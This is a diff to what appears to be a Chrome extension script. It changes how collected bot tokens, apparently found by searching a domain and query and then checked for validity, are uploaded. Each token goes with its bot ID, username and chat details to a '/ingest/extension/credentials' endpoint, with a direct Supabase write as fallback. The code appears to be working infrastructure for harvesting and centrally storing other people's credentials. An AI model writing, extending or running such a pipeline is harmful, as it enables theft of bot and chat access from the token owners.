@@ -293,7 +293,8 @@ function broadcastState() {
 
 // --- SUPABASE DIRECT UPLOAD ---
 // Credentials are stored in chrome.storage.sync (syncs across Chrome profiles).
-// The worker reads raw tokens from Supabase and encrypts them server-side.
+// If an API URL is configured, uploads route through the backend /ingest endpoint
+// for server-side Fernet encryption. Falls back to direct Supabase write otherwise.
 
 function sha256hex(str) {
     // Encode string to Uint8Array, hash with SubtleCrypto, return hex string
@@ -315,22 +316,83 @@ async function uploadToSupabase() {
     }
 
     const cfg = await new Promise((resolve) => {
-        // Config syncs across Chrome profiles via chrome.storage.sync
         chrome.storage.sync.get(["supabase_config"], (r) => resolve(r.supabase_config || {}));
     });
 
-    const supabaseUrl    = (cfg.supabaseUrl || "").trim().replace(/\/+$/, "");
-    const supabaseKey    = (cfg.supabaseKey || "").trim();
+    const apiUrl         = (cfg.apiUrl         || "").trim().replace(/\/+$/, "");
+    const supabaseUrl    = (cfg.supabaseUrl     || "").trim().replace(/\/+$/, "");
+    const supabaseKey    = (cfg.supabaseKey     || "").trim();
     const extensionSecret = (cfg.extensionSecret || "").trim();
 
-    if (!supabaseUrl || !supabaseKey || !extensionSecret) {
-        state.status = "⚠️ Upload skipped — set Supabase URL, Key, and Write Secret in settings";
+    // --- Route 1: API endpoint (preferred — server-side Fernet encryption) ---
+    if (apiUrl) {
+        state.status = `⬆️ Uploading ${validResults.length} tokens via API...`;
+        saveState();
+        broadcastState();
+
+        const payload = {
+            source: "extension",
+            domain: state.domain,
+            query: state.query,
+            results: validResults.map((r) => ({
+                token:        r.token,
+                chat_id:      r.chatId   || null,
+                chat_name:    r.chatTitle || null,
+                chat_type:    r.chatType  || null,
+                bot_id:       r.bot_id    ? String(r.bot_id) : null,
+                bot_username: r.bot_name  || r.botUsername   || null,
+                valid:        r.valid,
+                meta:         { domain: state.domain, query: state.query },
+            })),
+        };
+
+        try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 15000);
+            const res = await fetch(`${apiUrl}/ingest/extension/credentials`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+                signal: controller.signal,
+            });
+            clearTimeout(timeout);
+
+            if (res.ok) {
+                const data = await res.json().catch(() => ({}));
+                state.status = `✅ API Upload: ${data.inserted || 0} inserted, ${data.updated || 0} updated, ${data.skipped || 0} skipped`;
+            } else {
+                const text = await res.text().catch(() => "");
+                console.warn(`API upload failed: ${res.status} ${text}`);
+                state.status = `⚠️ API upload failed (${res.status}) — falling back to direct write`;
+                // Fall through to direct Supabase write
+                await _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults);
+                return;
+            }
+        } catch (e) {
+            console.warn("API upload exception:", e);
+            state.status = `⚠️ API unreachable — falling back to direct write`;
+            await _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults);
+            return;
+        }
+
         saveState();
         broadcastState();
         return;
     }
 
-    state.status = `⬆️ Uploading ${validResults.length} tokens to Supabase...`;
+    // --- Route 2: Direct Supabase write (fallback — raw token, self-healed by backend) ---
+    if (!supabaseUrl || !supabaseKey || !extensionSecret) {
+        state.status = "⚠️ Upload skipped — set API URL or Supabase credentials in settings";
+        saveState();
+        broadcastState();
+        return;
+    }
+
+    await _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults);
+}
+
+async function _uploadDirectToSupabase(supabaseUrl, supabaseKey, extensionSecret, validResults) {
+    state.status = `⬆️ Uploading ${validResults.length} tokens directly to Supabase...`;
     saveState();
     broadcastState();
 
@@ -399,7 +461,7 @@ async function uploadToSupabase() {
         }
     }
 
-    state.status = `✅ Uploaded: ${inserted} tokens (${skipped} skipped)`;
+    state.status = `✅ Direct Upload: ${inserted} tokens (${skipped} skipped)`;
     saveState();
     broadcastState();
 }
